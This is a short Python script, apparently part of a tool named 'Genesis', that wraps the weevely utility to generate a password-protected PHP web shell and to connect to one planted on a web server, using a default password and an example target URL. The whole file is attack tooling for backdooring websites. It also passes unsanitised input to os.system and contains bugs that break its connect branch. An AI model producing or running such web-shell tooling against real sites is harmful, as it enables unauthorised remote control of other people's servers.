import os
import sys

def main():
    choice = str(input("Connect or Generate? "))
    while not choice:
        choice = str(input("Connect or Generate? "))
    if choice.lower() == "generate" or choice == "gen":
        name = str(input("Name of the payload you want to generate [payload.php]")) or "payload.php"
        path_to_generate = "/opt/Genesis/Storage/" + name
        password = str(input("Password of the php payload [GenesisRocks]: ")) or "GenesisRocks"
        os.system("weevely generate "+ password + " " + path_to_generate)
        print("payload in " + path_to_generate)
    elif choice.lower == "connect" or choice.lower() == "con":
        url = str(input("Path to payload [google.com/index.php]: "))
        passw = str(input("Password to payload[GenesisRocks]: ")) or "GenesisRocks"
        os.system("weevely "+ url + " " + passw)
    else:
        choice == ""
main()
